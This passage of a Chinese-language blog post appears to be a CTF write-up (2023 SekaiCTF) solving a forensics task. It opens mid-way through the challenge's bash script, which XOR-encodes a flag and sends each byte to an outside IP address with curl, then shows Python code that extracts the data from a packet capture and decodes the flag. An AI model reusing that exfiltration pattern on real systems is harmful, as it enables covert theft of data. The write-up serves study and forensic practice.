class="line">XOREncrypt()&#123;</span><br><span class="line">    local key=&quot;$1&quot; DataIn=&quot;$2&quot;</span><br><span class="line">    local ptr DataOut val1 val2 val3</span><br><span class="line"></span><br><span class="line">    for (( ptr=0; ptr &lt; $&#123;#DataIn&#125;; ptr++ )); do</span><br><span class="line"></span><br><span class="line">        val1=$( Asc &quot;$&#123;DataIn:$ptr:1&#125;&quot; )</span><br><span class="line">        val2=$( Asc &quot;$&#123;key:$(( ptr % $&#123;#key&#125; )):1&#125;&quot; )</span><br><span class="line"></span><br><span class="line">        val3=$(( val1 ^ val2 ))</span><br><span class="line"></span><br><span class="line">        DataOut+=$(printf &#x27;%02x&#x27; &quot;$val3&quot;)</span><br><span class="line"></span><br><span class="line">    done</span><br><span class="line"></span><br><span class="line">    for ((i=0;i&lt;$&#123;#DataOut&#125;;i+=2)); do</span><br><span class="line">    BYTE=$&#123;DataOut:$i:2&#125;</span><br><span class="line">    curl -m 0.5 -X POST -H &quot;Content-Type: application/json&quot; -d &quot;&#123;\&quot;data\&quot;:\&quot;$BYTE\&quot;&#125;&quot; http://35.196.65.151:30899/ &amp;&gt;/dev/null</span><br><span class="line">    done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">XOREncrypt $KEY $FLAG</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>
+<p>就是简单的异或逻辑，给了流量包，把data提取出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从 pcap 文件中读取数据</span></span><br><span class="line">packets = <span class="built_in">open</span>(<span class="string">&#x27;capture.pcapng&#x27;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据并准备存储数据的列表</span></span><br><span class="line">data_values = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="comment"># 转换为字符串</span></span><br><span class="line">    packet_str = <span class="built_in">str</span>(packet)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式匹配 JSON 数据</span></span><br><span class="line">    matches = re.findall(<span class="string">r&#x27;\&#123;&quot;data&quot;:&quot;(\d+)&quot;\&#125;&#x27;</span>, packet_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将匹配的值添加到列表中</span></span><br><span class="line">    data_values.extend(matches)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印提取的 data 字段值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Extracted data values:&quot;</span>, data_values)</span><br></pre></td></tr></table></figure>
+<p>然后解出flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KEY=<span class="string">&#x27;s3k@1_v3ry_w0w&#x27;</span></span><br><span class="line">t = [<span class="number">32</span>,<span class="number">118</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">120</span>,<span class="number">36</span>,<span class="number">69</span>,<span class="number">69</span>,<span class="number">70</span>,<span class="number">21</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">40</span>,<span class="number">75</span>,<span class="number">65</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">67</span>,<span class="number">0</span>,<span class="number">78</span>,<span class="number">65</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">45</span>,<span class="number">5</span>,<span class="number">66</span>,<span class="number">5</span>,<span class="number">44</span>,<span class="number">11</span>,<span class="number">25</span>,<span class="number">50</span>,<span class="number">67</span>,<span class="number">45</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">45</span>,<span class="number">5</span>,<span class="number">66</span>,<span class="number">40</span>,<span class="number">82</span>,<span class="number">18</span>,<span class="number">74</span>,<span class="number">31</span>,<span class="number">9</span>,<span class="number">107</span>,<span class="number">78</span>,<span class="number">0</span>,<span class="number">15</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(KEY[i%<span class="built_in">len</span>(KEY)])^t[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>diffany
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gudiffany.github.io/2023/09/04/10-26-47/" title="2023sekaiCTF">https://gudiffany.github.io/2023/09/04/10-26-47/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/2023ctf/" rel="tag"><i class="fa fa-tag"></i> 2023ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/25/19-10-34/" rel="prev" title="JS原型链污染">
+                  <i class="fa fa-chevron-left"></i> JS原型链污染
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/09/08/14-20-17/" rel="next" title="2023DownUnderCTF">
+                  2023DownUnderCTF <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diffany</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+
+
+  <script src="[object Object]"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+
+
+<script>
+var options = {
+  bottom: '64px', // default: '32px'
+  right: 'unset', // default: '32px'
+  left: '32px', // default: 'unset'
+  time: '0.5s', // default: '0.3s'
+  mixColor: '#fff', // default: '#fff'
+  backgroundColor: '#fff',  // default: '#fff'
+  buttonColorDark: '#100f2c',  // default: '#100f2c'
+  buttonColorLight: '#fff', // default: '#fff'
+  saveInCookies: true, // default: true,
+  label: '🌓', // default: ''
+  autoMatchOsTheme: true // default: true
+}
+const darkmode = new Darkmode(options);
+darkmode.showWidget();
+</script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://unpkg.com/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ImshWy4c6kiRqFukNXuAeVYt-gzGzoHsz","app_key":"I15dpBmlxhPPxNgS0pn9Fer5","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://unpkg.com/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
